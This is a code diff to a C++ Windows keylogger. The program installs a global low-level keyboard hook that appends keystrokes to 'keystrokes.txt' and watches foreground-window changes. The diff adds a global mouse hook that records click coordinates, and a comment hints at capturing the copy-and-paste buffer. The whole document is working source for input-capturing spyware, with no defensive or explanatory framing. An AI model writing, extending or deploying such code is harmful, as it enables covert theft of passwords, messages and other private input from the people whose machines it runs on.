@@ -8,12 +8,17 @@ using namespace std;
 
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 HHOOK keyboardHook;
-std::ofstream outputFile("keystrokes.txt", std::ios::app);
+HHOOK hCBTHook;
+HHOOK mouseHook;                                                                               //cpy&paste buffer
 
+std::ofstream outputFile("keystrokes.txt", std::ios::app);
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam);
 void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime);
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+
 int main()
 {
     // Set the event hook to monitor foreground window changes
@@ -22,6 +27,9 @@ int main()
     // Correct way to get module handle for the hook:
     HINSTANCE hInstance = GetModuleHandle(NULL); // Get handle to *this* module
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
+
+    HINSTANCE hInstance_mouse = GetModuleHandle(NULL);
+    mouseHook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, hInstance_mouse, 0);
 
     // Message loop to keep the application running and processing window event hooks
     MSG msg;
@@ -32,11 +40,9 @@ int main()
     }
 
     UnhookWindowsHookEx(keyboardHook);
-    // Close the output file
-    outputFile.close();
-    
-    // Cleanup the event hook
     UnhookWinEvent(hook);
+    UnhookWindowsHookEx(mouseHook);
+    outputFile.close();
 
     return 0;
 }
@@ -60,6 +66,32 @@ void CALLBACK WinEventProc(HWINEVENTHOOK hWinEventHook, DWORD event, HWND hwnd, 
             CloseHandle(hProcess);
         }
     }
+}
+
+LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+    if (nCode >= 0)
+    {
+        MSLLHOOKSTRUCT* mouseStruct = (MSLLHOOKSTRUCT*)lParam;
+        int x = mouseStruct->pt.x;
+        int y = mouseStruct->pt.y;
+
+        switch (wParam)
+        {
+            case WM_LBUTTONDOWN:
+                std::wcout << L"\n[Left click (" << x << L", " << y << L")]";
+                //outputFile << L"\n[Left click (" << x << L", " << y << L")]";
+                //outputFile.flush();
+                break;
+            case WM_RBUTTONDOWN:
+                std::wcout << L"\n[Right click (" << x << L", " << y << L")]";
+                //outputFile << L"\n[Right click (" << x << L", " << y << L")]";
+                //outputFile.flush();
+                break;
+            // You can add cases for other mouse events like WM_MBUTTONDOWN (middle button) if needed.
+        }
+    }
+    return CallNextHookEx(mouseHook, nCode, wParam, lParam);
 }
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -233,3 +265,4 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 
     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
+
